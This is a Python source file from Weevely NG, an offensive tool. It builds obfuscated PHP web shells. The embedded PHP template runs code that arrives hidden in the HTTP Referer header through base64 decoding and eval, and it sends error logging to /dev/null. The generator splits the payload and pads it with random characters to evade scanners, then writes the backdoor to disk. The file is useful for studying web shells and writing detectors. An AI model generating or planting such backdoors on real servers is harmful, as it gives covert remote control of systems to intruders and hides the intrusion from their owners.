# -*- coding: utf-8 -*-
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
import base64, codecs
from random import random, randrange, choice

class Backdoor:
	payload_template = """
ini_set('error_log', '/dev/null');
parse_str($_SERVER['HTTP_REFERER'],$a);
if(reset($a)=='%%%START_KEY%%%' && count($a)==9) {
echo '<%%%END_KEY%%%>';
eval(base64_decode(str_replace(" ", "+", join(array_slice($a,count($a)-3)))));
echo '</%%%END_KEY%%%>';
}
"""

	backdoor_template = "<?php eval(base64_decode('%%%PAYLOAD%%%')); ?>"
	
	backdoor_template = """<?php 
$%%PAY_VAR%%1="%%PAYLOAD1%%";
$%%PAY_VAR%%2="%%PAYLOAD2%%";
$%%PAY_VAR%%3="%%PAYLOAD3%%";
$%%PAY_VAR%%4="%%PAYLOAD4%%";
$%%B64_FUNC%% = "%%B64_ENCODED%%";
$%%REPL_FUNC%% = "str_replace";
$%%B64_FUNC%% = $%%REPL_FUNC%%("%%B64_POLLUTION%%", "", $%%B64_FUNC%%);
eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%PAY_VAR%%2.$%%PAY_VAR%%3.$%%PAY_VAR%%4))); 
?>
"""

	def __init__( self, password ):
		
		if len(password)<4:
			raise Exception('Password \'%s\' too short, choose another one' % password)
		
		self.password  = password
		self.start_key = self.password[:2]
		self.end_key   = self.password[2:]
		self.payload   = self.payload_template.replace( '%%%START_KEY%%%', self.start_key ).replace( '%%%END_KEY%%%', self.end_key ).replace( '\n', '' )
		self.backdoor  = self.encode_template()

	def __str__( self ):
		return self.backdoor

	def __random_string(self, len=4, fixed=False):
		if not fixed:
			len = randrange(2,len)
		return ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(len)])
		
	def __pollute_string(self, str, frequency=0.1):

		pollution_chars = self.__random_string(16, True)

		pollution = ''
		for i in range(0, len(pollution_chars)):
			pollution = pollution_chars[:i]
			if (not pollution in str) :
				break
			
		if not pollution:
			raise Exception('Bad randomization, choose a different password')
			
		str_encoded = ''
		for char in str:
			if random() < frequency:
				str_encoded += pollution + char
			else:
				str_encoded += char
				
		return pollution, str_encoded
		
		

	def encode_template(self):
		
		b64_new_func_name = self.__random_string()
		b64_pollution, b64_polluted = self.__pollute_string('base64_decode',0.7)
		
		payload_var = self.__random_string()
		payload_pollution, payload_polluted = self.__pollute_string(base64.b64encode(self.payload))
		
		replace_new_func_name = self.__random_string()
		
		
		length  = len(payload_polluted)
		offset = 7
		piece1	= length / 4 + randrange(-offset,+offset)
		piece2  = length / 2 + randrange(-offset,+offset)
		piece3  = length*3/4 + randrange(-offset,+offset)
		
		template = self.backdoor_template.replace( '%%B64_ENCODED%%', b64_polluted )
		template = template.replace( '%%B64_FUNC%%', b64_new_func_name )
		template = template.replace( '%%PAY_VAR%%', payload_var )
		template = template.replace( '%%PAYLOAD_POLLUTION%%', payload_pollution )
		template = template.replace( '%%B64_POLLUTION%%', b64_pollution )
		template = template.replace( '%%PAYLOAD1%%', payload_polluted[:piece1] )
		template = template.replace( '%%PAYLOAD2%%', payload_polluted[piece1:piece2] )
		template = template.replace( '%%PAYLOAD3%%', payload_polluted[piece2:piece3] )
		template = template.replace( '%%PAYLOAD4%%', payload_polluted[piece3:] )
		
		
		template = template.replace( '%%REPL_FUNC%%', replace_new_func_name )
		
		return template
			
		

	def save( self, filename ):
		out = file( filename, 'wt' )
		out.write( self.backdoor )
		out.close()

		print "+ Backdoor file '%s' created with password '%s'." % ( filename, self.password )
